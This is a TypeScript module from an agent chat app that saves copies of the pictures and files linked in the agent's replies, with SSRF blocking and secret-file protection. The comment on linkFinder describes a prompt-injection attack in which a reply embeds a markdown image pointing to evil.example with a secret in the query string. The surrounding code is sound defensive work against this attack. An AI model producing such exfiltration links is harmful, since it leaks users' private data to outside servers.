import { execFile } from 'node:child_process';
import { createHash, randomUUID } from 'node:crypto';
import { lookup } from 'node:dns';
import {
	closeSync,
	createReadStream,
	createWriteStream,
	existsSync,
	linkSync,
	mkdirSync,
	openSync,
	readSync,
	readdirSync,
	realpathSync,
	renameSync,
	rmSync,
	statSync,
	utimesSync,
	writeFileSync
} from 'node:fs';
import { get as httpGet, type IncomingMessage } from 'node:http';
import { get as httpsGet } from 'node:https';
import { BlockList, isIP, type LookupFunction } from 'node:net';
import { homedir, networkInterfaces } from 'node:os';
import { basename, extname, isAbsolute, join, resolve } from 'node:path';
import type { Readable } from 'node:stream';
import { pipeline } from 'node:stream/promises';
import { fileURLToPath } from 'node:url';
import { promisify } from 'node:util';
import { and, eq, like } from 'drizzle-orm';
import { getDb } from './db/index.ts';
import { folderFile, media, message, upload } from './db/schema.ts';
import { inspectImage } from './images.ts';
import { isRemoteHref, mediaRefs } from './media-refs.ts';
import { paths } from './paths.ts';

/**
 * Pictures and files in the agent's replies. When a reply is saved, every picture
 * (`![alt](src)`) and file link (`[label](src)`) it contains is copied byte for byte into
 * `~/.nolune/media/<sha256>`, so the chat keeps showing it after the original moves or
 * disappears. The pictures commands attach with `nolune view` are kept the same way, to show under
 * the command. The web UI only ever loads these copies, through ids checked against the
 * conversation.
 */

export type MediaRow = typeof media.$inferSelect;
export type MediaStatus = MediaRow['status'];

/** A copy made for a reply that isn't saved yet: the row without its ids. */
export type PreparedMedia = Omit<MediaRow, 'id' | 'conversationId' | 'messageId' | 'createdAt'>;

/** What the chat needs to show one picture or file, keyed by its link target in the reply. */
export type DisplayMedia =
	| {
			status: 'ok';
			id: string;
			name: string;
			mime: string;
			bytes: number;
			width: number | null;
			height: number | null;
			/** Shown as a picture (the original, or a JPEG copy of it) rather than as a download. */
			viewable: boolean;
	  }
	| { status: Exclude<MediaStatus, 'ok'>; name: string; error: string };

export const MAX_MEDIA_BYTES = 100 * 1024 * 1024;
const MAX_PER_REPLY = 30;
const FETCH_TIMEOUT_MS = 30_000;
const MAX_REDIRECTS = 5;
const CONVERT_TIMEOUT_MS = 60_000;
/** Enough to find the size of a JPEG behind a large EXIF block. */
const HEAD_BYTES = 1024 * 1024;
/** Unreferenced files younger than this are kept: a copy may be about to get its row. */
const ORPHAN_GRACE_MS = 60 * 60 * 1000;

/** Picture types every current browser shows in an <img>. */
const VIEWABLE = new Set([
	'image/png',
	'image/jpeg',
	'image/gif',
	'image/webp',
	'image/avif',
	'image/svg+xml',
	'image/bmp',
	'image/x-icon'
]);
/** Pictures browsers can't show, displayed through a JPEG copy made with macOS's `sips`. */
const CONVERTIBLE = new Set(['image/heic', 'image/heif', 'image/tiff']);

const IMAGE_EXTENSIONS: Record<string, string> = {
	'image/png': '.png',
	'image/jpeg': '.jpg',
	'image/gif': '.gif',
	'image/webp': '.webp',
	'image/avif': '.avif',
	'image/svg+xml': '.svg',
	'image/bmp': '.bmp',
	'image/x-icon': '.ico',
	'image/heic': '.heic',
	'image/heif': '.heif',
	'image/tiff': '.tiff'
};

/** For files whose content doesn't say what they are. */
const EXTENSION_TYPES: Record<string, string> = {
	'.txt': 'text/plain',
	'.md': 'text/markdown',
	'.csv': 'text/csv',
	'.html': 'text/html',
	'.htm': 'text/html',
	'.json': 'application/json',
	'.xml': 'application/xml',
	'.ics': 'text/calendar',
	'.vcf': 'text/vcard',
	'.rtf': 'application/rtf',
	'.zip': 'application/zip',
	'.epub': 'application/epub+zip',
	'.doc': 'application/msword',
	'.docx': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
	'.xls': 'application/vnd.ms-excel',
	'.xlsx': 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
	'.ppt': 'application/vnd.ms-powerpoint',
	'.pptx': 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
	'.mp3': 'audio/mpeg',
	'.m4a': 'audio/mp4',
	'.wav': 'audio/wav',
	'.mp4': 'video/mp4',
	'.mov': 'video/quicktime'
};

export function blobPath(sha256: string): string {
	return join(paths.media, sha256);
}

export function isViewable(row: Pick<MediaRow, 'mime' | 'previewSha256'>): boolean {
	return !!row.previewSha256 || (!!row.mime && VIEWABLE.has(row.mime));
}

function formatMegabytes(bytes: number): string {
	return `${Math.round(bytes / (1024 * 1024))} MB`;
}

// --- copying ---

export class TooLargeError extends Error {}

/** Streams into the store under the content's SHA-256. The same content is stored once. */
export async function store(
	source: Readable,
	signal?: AbortSignal
): Promise<{ sha256: string; bytes: number }> {
	mkdirSync(paths.media, { recursive: true });
	const tmp = join(paths.media, `tmp-${randomUUID()}`);
	const hash = createHash('sha256');
	let bytes = 0;
	try {
		await pipeline(
			source,
			async function* (chunks: AsyncIterable<Uint8Array>) {
				for await (const chunk of chunks) {
					bytes += chunk.length;
					if (bytes > MAX_MEDIA_BYTES) throw new TooLargeError();
					hash.update(chunk);
					yield chunk;
				}
			},
			createWriteStream(tmp),
			{ signal }
		);
	} catch (err) {
		rmSync(tmp, { force: true });
		throw err;
	}
	const sha256 = hash.digest('hex');
	const dest = blobPath(sha256);
	if (existsSync(dest)) {
		rmSync(tmp, { force: true });
		// Fresh again, so the orphan sweep leaves it alone until the row is saved.
		const now = new Date();
		utimesSync(dest, now, now);
	} else {
		renameSync(tmp, dest);
	}
	return { sha256, bytes };
}

/** Keeps `data` in the store under its SHA-256, like `store`. */
export function storeBytes(data: Buffer): { sha256: string; bytes: number } {
	if (data.length > MAX_MEDIA_BYTES) throw new TooLargeError();
	mkdirSync(paths.media, { recursive: true });
	const sha256 = createHash('sha256').update(data).digest('hex');
	const dest = blobPath(sha256);
	if (existsSync(dest)) {
		const now = new Date();
		utimesSync(dest, now, now);
	} else {
		const tmp = join(paths.media, `tmp-${randomUUID()}`);
		writeFileSync(tmp, data);
		renameSync(tmp, dest);
	}
	return { sha256, bytes: data.length };
}

function collectMedia(value: unknown, hashes: Set<string>): void {
	if (Array.isArray(value)) {
		for (const item of value) collectMedia(item, hashes);
	} else if (value && typeof value === 'object') {
		const record = value as Record<string, unknown>;
		if (record.type === 'media' && typeof record.sha256 === 'string') hashes.add(record.sha256);
		for (const child of Object.values(record)) collectMedia(child, hashes);
	}
}

/**
 * The stored files messages send by reference: pictures and PDFs in nolune's format (format.ts),
 * which each provider gets a copy of when a request is made.
 */
export function referencedMedia(): Set<string> {
	const hashes = new Set<string>();
	const rows = getDb()
		.select({ content: message.content })
		.from(message)
		.where(like(message.content, '%"type":"media"%'))
		.all();
	for (const row of rows) collectMedia(JSON.parse(row.content), hashes);
	return hashes;
}

function resolveLocal(href: string, baseDir: string): string {
	if (/^file:/i.test(href)) {
		try {
			return fileURLToPath(href);
		} catch {
			return href;
		}
	}
	if (href === '~') return homedir();
	if (href.startsWith('~/')) return join(homedir(), href.slice(2));
	return isAbsolute(href) ? href : resolve(baseDir, href);
}

/** The file a local link points to, also trying it URL-decoded (`My%20Photos`). */
function findLocal(href: string, baseDir: string): string | null {
	const candidates = [resolveLocal(href, baseDir)];
	try {
		const decoded = decodeURIComponent(href);
		if (decoded !== href) candidates.push(resolveLocal(decoded, baseDir));
	} catch {
		// not URL-encoded
	}
	return candidates.find((file) => existsSync(file)) ?? null;
}

/** nolune's own secrets never leave through a chat, whatever a reply links to. */
function isPrivate(realFile: string): boolean {
	const db = paths.db;
	return [paths.config, db, `${db}-wal`, `${db}-shm`, `${db}-journal`].some((file) => {
		try {
			return realpathSync(file) === realFile;
		} catch {
			return file === realFile;
		}
	});
}

function nameFromHref(href: string): string {
	if (isRemoteHref(href)) {
		try {
			return decodeURIComponent(basename(new URL(href).pathname));
		} catch {
			return '';
		}
	}
	return basename(href.replace(/[\\/]+$/, ''));
}

function describeError(err: unknown, remote: boolean): string {
	const e = err as { name?: string; code?: string; cause?: { name?: string } };
	if (e?.name === 'TimeoutError' || e?.cause?.name === 'TimeoutError') {
		return 'Downloading it took too long';
	}
	if (e?.name === 'AbortError') return 'Stopped before it was copied';
	const message = err instanceof Error ? err.message : String(err);
	if (remote) return `Couldn't download it (${e?.code ?? message})`;
	if (e?.code === 'EACCES' || e?.code === 'EPERM') {
		return 'nolune is not allowed to read this file (on a Mac, check Full Disk Access)';
	}
	return message;
}

/** A row for a target that wasn't copied, saying why. */
function unavailable(
	src: string,
	name: string,
	status: Exclude<MediaStatus, 'ok'>,
	error: string
): PreparedMedia {
	return {
		src,
		status,
		error,
		name,
		sha256: null,
		mime: null,
		bytes: null,
		width: null,
		height: null,
		previewSha256: null
	};
}

// --- web pictures ---

/** Characters that would continue a URL, so a match followed by one is only part of a link. */
const URL_CONTINUES = /[\w\-~%/?#=&+@]/;

/**
 * Whether the agent found a web link rather than wrote it: the link appears, whole, in what people
 * wrote or commands printed earlier in the conversation (the rule of Anthropic's web fetch tool).
 * The gateway downloads web pictures itself, so without this a prompt-injected reply could send
 * what the agent read to any server just by showing `![](https://evil.example/p.png?d=<secret>)`.
 * `earlierText` is read once, and only if the reply has a web picture.
 */
function linkFinder(earlierText: () => string): (href: string) => boolean {
	let text: string | undefined;
	return (href) => {
		// Links as they appear in HTML (`&amp;`) and in escaped JSON (`\/`).
		text ??= earlierText().replaceAll('&amp;', '&').replaceAll('\\/', '/');
		for (let at = text.indexOf(href); at !== -1; at = text.indexOf(href, at + 1)) {
			// Not the start of a longer link, cut short where the agent chose.
			if (!URL_CONTINUES.test(text.charAt(at + href.length))) return true;
		}
		return false;
	};
}

/** Loopback, private, shared (CGNAT, Tailscale), link-local, multicast and reserved networks. */
const LOCAL_NETWORKS = new BlockList();
for (const [network, prefix] of [
	['0.0.0.0', 8],
	['10.0.0.0', 8],
	['100.64.0.0', 10],
	['127.0.0.0', 8],
	['169.254.0.0', 16],
	['172.16.0.0', 12],
	['192.168.0.0', 16],
	['224.0.0.0', 3]
] as const) {
	LOCAL_NETWORKS.addSubnet(network, prefix, 'ipv4');
}
for (const [network, prefix] of [
	['::', 96],
	['fc00::', 7],
	['fe80::', 10],
	['fec0::', 10],
	['ff00::', 8]
] as const) {
	LOCAL_NETWORKS.addSubnet(network, prefix, 'ipv6');
}

/**
 * An address on this computer or the local network. Web pictures are never downloaded from one,
 * so a link can't make the gateway open the router's pages or a service on this computer.
 */
function isLocalAddress(address: string): boolean {
	// IPv4-mapped IPv6 addresses (`::ffff:127.0.0.1`) are checked against the IPv4 networks.
	if (LOCAL_NETWORKS.check(address, isIP(address) === 6 ? 'ipv6' : 'ipv4')) return true;
	// This computer's own public addresses (a Mac usually has a global IPv6 one) reach it too.
	return Object.values(networkInterfaces()).some((list) =>
		list?.some((iface) => iface.address === address)
	);
}

class LocalAddressError extends Error {}

/**
 * DNS lookup for downloads that refuses local addresses. Node calls it for every connection it
 * makes, so a host name can't pass the check and then resolve to somewhere else.
 */
const publicLookup: LookupFunction = (hostname, options, callback) => {
	lookup(hostname, { ...options, all: true }, (err, addresses) => {
		if (err) return callback(err, '');
		if (addresses.some((a) => isLocalAddress(a.address))) {
			return callback(new LocalAddressError(), '');
		}
		if (options.all) callback(null, addresses);
		else callback(null, addresses[0].address, addresses[0].family);
	});
};

/** GETs a web picture, following redirects, from public addresses only. */
async function download(href: string, signal: AbortSignal): Promise<IncomingMessage> {
	let url = new URL(href);
	for (let redirects = 0; ; redirects++) {
		// Node doesn't look up an IP address, so those are checked here.
		const host = url.hostname.replace(/^\[(.*)\]$/, '$1');
		if (isIP(host) && isLocalAddress(host)) throw new LocalAddressError();
		const get = url.protocol === 'https:' ? httpsGet : httpGet;
		const res = await new Promise<IncomingMessage>((resolve, reject) => {
			get(
				url,
				{
					headers: {
						accept: 'image/*,*/*;q=0.5',
						'accept-encoding': 'identity',
						'user-agent': 'nolune'
					},
					lookup: publicLookup,
					// A fresh connection, never one another request left open.
					agent: false,
					signal
				},
				resolve
			).on('error', reject);
		});
		const status = res.statusCode ?? 0;
		const location = res.headers.location;
		if (status < 300 || status >= 400 || !location) return res;
		res.destroy();
		if (redirects === MAX_REDIRECTS) throw new Error('too many redirects');
		url = new URL(location, url);
	}
}

const execFileAsync = promisify(execFile);

/** A full-size JPEG copy of a HEIC or TIFF picture, on macOS. Null where `sips` isn't there. */
async function convertToJpeg(sha256: string, mime: string): Promise<string | null> {
	if (process.platform !== 'darwin') return null;
	const id = randomUUID();
	// sips reads the format from the file name, so it gets a link with the right extension.
	const input = join(paths.media, `tmp-${id}${IMAGE_EXTENSIONS[mime] ?? ''}`);
	const output = join(paths.media, `tmp-${id}.jpg`);
	try {
		linkSync(blobPath(sha256), input);
		await execFileAsync('/usr/bin/sips', ['-s', 'format', 'jpeg', input, '--out', output], {
			timeout: CONVERT_TIMEOUT_MS
		});
		return (await store(createReadStream(output))).sha256;
	} catch (err) {
		console.error(`[nolune] couldn't convert a ${mime} picture to JPEG:`, err);
		return null;
	} finally {
		rmSync(input, { force: true });
		rmSync(output, { force: true });
	}
}

async function copyOne(href: string, baseDir: string, signal: AbortSignal): Promise<PreparedMedia> {
	let name = nameFromHref(href) || 'file';
	const problem = (status: Exclude<MediaStatus, 'ok'>, error: string) =>
		unavailable(href, name, status, error);
	const tooLarge = () => problem('too_large', `Larger than ${formatMegabytes(MAX_MEDIA_BYTES)}`);

	const remote = isRemoteHref(href);
	try {
		let stored: { sha256: string; bytes: number };
		if (remote) {
			const downloadSignal = AbortSignal.any([signal, AbortSignal.timeout(FETCH_TIMEOUT_MS)]);
			const res = await download(href, downloadSignal);
			const status = res.statusCode ?? 0;
			if (status < 200 || status >= 300) {
				res.destroy();
				return problem('failed', `Couldn't download it (the server answered ${status})`);
			}
			if (Number(res.headers['content-length']) > MAX_MEDIA_BYTES) {
				res.destroy();
				return tooLarge();
			}
			stored = await store(res, downloadSignal);
		} else {
			const file = findLocal(href, baseDir);
			if (!file) return problem('missing', 'File not found');
			name = basename(file);
			const real = realpathSync(file);
			const info = statSync(real);
			if (info.isDirectory()) return problem('unsupported', 'This is a folder, not a file');
			if (!info.isFile()) return problem('unsupported', 'This is not a regular file');
			if (isPrivate(real)) {
				return problem('blocked', "nolune's own settings and database are never shared");
			}
			if (info.size > MAX_MEDIA_BYTES) return tooLarge();
			stored = await store(createReadStream(real), signal);
		}

		const mime = storedType(stored.sha256, name);
		// A web link in a picture that turns out to be a page gets no row pointing at the copy;
		// the orphan sweep removes it.
		if (remote && !mime.startsWith('image/')) {
			return problem('unsupported', 'The link is not a picture');
		}
		if (remote && !extname(name) && IMAGE_EXTENSIONS[mime]) {
			name = `${name === 'file' ? 'picture' : name}${IMAGE_EXTENSIONS[mime]}`;
		}
		return describeStored({ ...stored, mime }, name, href);
	} catch (err) {
		if (err instanceof TooLargeError) return tooLarge();
		if (err instanceof LocalAddressError) {
			return problem(
				'blocked',
				"nolune doesn't download pictures from this computer or the local network"
			);
		}
		return problem('failed', describeError(err, remote));
	}
}

/** The type of content in the store, from its first bytes (the name only for non-pictures). */
export function storedType(sha256: string, name: string): string {
	return sniffType(readHead(blobPath(sha256)), name);
}

/**
 * The media row for content already in the store: a picture's size, and a JPEG copy of HEIC
 * and TIFF pictures for browsers. Attachments people send get theirs this way too.
 */
export async function describeStored(
	stored: { sha256: string; bytes: number; mime: string },
	name: string,
	src: string
): Promise<PreparedMedia> {
	let previewSha256: string | null = null;
	let size = imageSize(readHead(blobPath(stored.sha256)), stored.mime);
	if (CONVERTIBLE.has(stored.mime)) {
		previewSha256 = await convertToJpeg(stored.sha256, stored.mime);
		if (previewSha256) size = imageSize(readHead(blobPath(previewSha256)), 'image/jpeg');
	}
	return {
		src,
		status: 'ok',
		error: null,
		name,
		sha256: stored.sha256,
		mime: stored.mime,
		bytes: stored.bytes,
		width: size?.width ?? null,
		height: size?.height ?? null,
		previewSha256
	};
}

/**
 * Copies the pictures and files that a reply's text links to. Runs before the reply is saved,
 * so the reply and its copies appear in the transcript together. Never throws: whatever can't
 * be copied gets a row that says why, and the chat shows that instead. `earlierText`: what
 * people wrote and commands printed before this reply, where web pictures' links must appear.
 */
export async function copyReplyMedia(
	texts: string[],
	baseDir: string,
	signal: AbortSignal,
	earlierText: () => string
): Promise<PreparedMedia[]> {
	let refs: string[];
	try {
		refs = [...new Set(texts.flatMap((text) => mediaRefs(text)))];
	} catch (err) {
		console.error('[nolune] reading the links in a reply failed:', err);
		return [];
	}
	const wasFound = linkFinder(earlierText);
	return Promise.all(
		refs.map(async (href, i) => {
			const name = nameFromHref(href) || 'file';
			if (i >= MAX_PER_REPLY) {
				return unavailable(
					href,
					name,
					'failed',
					`Only the first ${MAX_PER_REPLY} pictures and files of a reply are kept`
				);
			}
			if (isRemoteHref(href) && !wasFound(href)) {
				return unavailable(
					href,
					name,
					'blocked',
					'Web pictures are shown only when nolune found the link on a page or in a message'
				);
			}
			return copyOne(href, baseDir, signal);
		})
	);
}

/** The `src` of a picture `nolune view` attached to a command's result: the call, and which one. */
export function viewedSrc(callId: string, index: number): string {
	return `${callId}#${index}`;
}

/**
 * The pictures a command attached with `nolune view`, in order, from its result's rows. Null for
 * a row that isn't one of them.
 */
export function viewedIndex(src: string, callId: string): number | null {
	const prefix = `${callId}#`;
	if (!src.startsWith(prefix)) return null;
	const index = Number(src.slice(prefix.length));
	return Number.isInteger(index) && index >= 0 ? index : null;
}

/** `name` with the extension of `mime`, where it names another type: a HEIC shown as a JPEG. */
function withExtension(name: string, mime: string): string {
	const ext = IMAGE_EXTENSIONS[mime];
	const current = extname(name).toLowerCase();
	if (!ext || current === ext || (ext === '.jpg' && current === '.jpeg')) return name;
	return `${basename(name, extname(name))}${ext}`;
}

/**
 * Copies of the pictures `nolune view` attached to a command's result, as the model got them
 * (HEIC and big photos converted), for the chat to show under the command. A picture that can't
 * be kept is left out: the model has it all the same.
 */
export async function copyViewedImages(
	callId: string,
	images: { name: string; data: Buffer; mediaType: string }[]
): Promise<PreparedMedia[]> {
	const copies: PreparedMedia[] = [];
	for (const [i, image] of images.entries()) {
		try {
			const name = withExtension(basename(image.name) || 'picture', image.mediaType);
			const stored = { ...storeBytes(image.data), mime: image.mediaType };
			copies.push(await describeStored(stored, name, viewedSrc(callId, i)));
		} catch (err) {
			console.error(`[nolune] keeping ${image.name} for the chat failed:`, err);
		}
	}
	return copies;
}

// --- reading files ---

function readHead(file: string, length = HEAD_BYTES): Buffer {
	const fd = openSync(file, 'r');
	try {
		const buf = Buffer.alloc(length);
		return buf.subarray(0, readSync(fd, buf, 0, length, 0));
	} finally {
		closeSync(fd);
	}
}

const SVG = /^\s*(?:<\?xml[^>]*>\s*)?(?:<!--[\s\S]*?-->\s*|<!DOCTYPE[^>]*>\s*)*<svg[\s>]/i;

/** The type from the content, falling back to the extension. Never trusts an extension for pictures. */
function sniffType(head: Buffer, name: string): string {
	const ascii = (start: number, end: number) => head.toString('latin1', start, end);
	if (ascii(0, 8) === '\x89PNG\r\n\x1a\n') return 'image/png';
	if (head[0] === 0xff && head[1] === 0xd8 && head[2] === 0xff) return 'image/jpeg';
	if (ascii(0, 6) === 'GIF87a' || ascii(0, 6) === 'GIF89a') return 'image/gif';
	if (ascii(0, 4) === 'RIFF' && ascii(8, 12) === 'WEBP') return 'image/webp';
	if (ascii(4, 8) === 'ftyp' && head.length >= 16) {
		// ISO media: the brands tell pictures (AVIF, HEIC) from videos (MP4, MOV).
		const end = Math.min(head.length, Math.max(16, head.readUInt32BE(0)), 128);
		const brands = [ascii(8, 12)];
		for (let i = 16; i + 4 <= end; i += 4) brands.push(ascii(i, i + 4));
		if (brands.some((b) => b === 'avif' || b === 'avis')) return 'image/avif';
		if (brands.some((b) => ['heic', 'heix', 'hevc', 'hevx', 'heim', 'heis'].includes(b))) {
			return 'image/heic';
		}
		if (brands.some((b) => b === 'mif1' || b === 'msf1')) return 'image/heif';
	}
	// TIFF, and camera RAW files built on it (DNG, CR2, NEF), which sips converts too.
	if (ascii(0, 4) === 'II*\0' || ascii(0, 4) === 'MM\0*') return 'image/tiff';
	if (ascii(0, 2) === 'BM' && head.length > 26 && [12, 40, 52, 56, 108, 124].includes(head[14])) {
		return 'image/bmp';
	}
	if (head.length > 6 && head.readUInt32BE(0) === 0x100 && head.readUInt16LE(4) > 0) {
		return 'image/x-icon';
	}
	if (ascii(0, 5) === '%PDF-') return 'application/pdf';
	if (SVG.test(head.toString('utf8', 0, 4096).replace(/^\uFEFF/, ''))) return 'image/svg+xml';
	return EXTENSION_TYPES[extname(name).toLowerCase()] ?? 'application/octet-stream';
}

interface Size {
	width: number;
	height: number;
}

/** Pixel size from the header, as displayed (a rotated JPEG's sides swapped). */
function imageSize(head: Buffer, mime: string): Size | null {
	if (mime === 'image/bmp') {
		try {
			const size = { width: head.readInt32LE(18), height: Math.abs(head.readInt32LE(22)) };
			return size.width > 0 && size.height > 0 ? size : null;
		} catch {
			return null; // truncated header
		}
	}
	const info = inspectImage(head);
	if (!info || info.mediaType !== mime) return null;
	// Orientations 5-8 turn the picture by 90°, which browsers apply when showing it.
	return info.orientation >= 5 && info.orientation <= 8
		? { width: info.height, height: info.width }
		: { width: info.width, height: info.height };
}

// --- database ---

export function newMediaId(): string {
	return randomUUID();
}

/** Every copy in the conversation, grouped by the reply it belongs to. */
export function mediaByMessage(conversationId: string): Map<number, MediaRow[]> {
	const byMessage = new Map<number, MediaRow[]>();
	const rows = getDb().select().from(media).where(eq(media.conversationId, conversationId)).all();
	for (const row of rows) {
		const list = byMessage.get(row.messageId);
		if (list) list.push(row);
		else byMessage.set(row.messageId, [row]);
	}
	return byMessage;
}

export function listMedia(messageId: number): MediaRow[] {
	return getDb().select().from(media).where(eq(media.messageId, messageId)).all();
}

export function getMedia(conversationId: string, id: string): MediaRow | undefined {
	return getDb()
		.select()
		.from(media)
		.where(and(eq(media.id, id), eq(media.conversationId, conversationId)))
		.get();
}

export function toDisplayMedia(rows: MediaRow[]): Record<string, DisplayMedia> {
	const out: Record<string, DisplayMedia> = {};
	for (const row of rows) {
		out[row.src] =
			row.status === 'ok' && row.mime && row.bytes !== null
				? {
						status: 'ok',
						id: row.id,
						name: row.name,
						mime: row.mime,
						bytes: row.bytes,
						width: row.width,
						height: row.height,
						viewable: isViewable(row)
					}
				: {
						status: row.status === 'ok' ? 'failed' : row.status,
						name: row.name,
						error: row.error ?? 'Not available'
					};
	}
	return out;
}

/**
 * The file to send: for viewing, the picture itself or its JPEG copy; for downloading, the
 * original. `inline` is false for anything that isn't a picture a browser shows.
 */
export function mediaFile(
	row: Pick<MediaRow, 'status' | 'sha256' | 'mime' | 'previewSha256' | 'name'>,
	purpose: 'view' | 'download'
): { path: string; mime: string; name: string; inline: boolean } | null {
	if (row.status !== 'ok' || !row.sha256 || !row.mime) return null;
	if (purpose === 'view' && row.previewSha256) {
		const name = `${basename(row.name, extname(row.name))}.jpg`;
		return { path: blobPath(row.previewSha256), mime: 'image/jpeg', name, inline: true };
	}
	return {
		path: blobPath(row.sha256),
		mime: row.mime,
		name: row.name,
		inline: purpose === 'view' && VIEWABLE.has(row.mime)
	};
}

/**
 * Deletes stored files no row points to any more (their conversations or folders were deleted,
 * or an upload was never sent), messages' pictures and PDFs included. Files younger than an hour
 * are kept, since a row being saved may be about to reference them.
 */
export function pruneMedia(): void {
	if (!existsSync(paths.media)) return;
	const used = new Set<string>();
	const rows = getDb()
		.select({ sha256: media.sha256, previewSha256: media.previewSha256 })
		.from(media)
		.all();
	for (const row of rows) {
		if (row.sha256) used.add(row.sha256);
		if (row.previewSha256) used.add(row.previewSha256);
	}
	for (const row of getDb().select({ sha256: upload.sha256 }).from(upload).all()) {
		used.add(row.sha256);
	}
	for (const sha256 of referencedMedia()) used.add(sha256);
	const folderFiles = getDb()
		.select({ sha256: folderFile.sha256, previewSha256: folderFile.previewSha256 })
		.from(folderFile)
		.all();
	for (const row of folderFiles) {
		used.add(row.sha256);
		if (row.previewSha256) used.add(row.previewSha256);
	}
	const cutoff = Date.now() - ORPHAN_GRACE_MS;
	for (const name of readdirSync(paths.media)) {
		if (used.has(name)) continue;
		const file = join(paths.media, name);
		try {
			if (statSync(file).mtimeMs < cutoff) rmSync(file, { force: true });
		} catch {
			// already gone
		}
	}
}
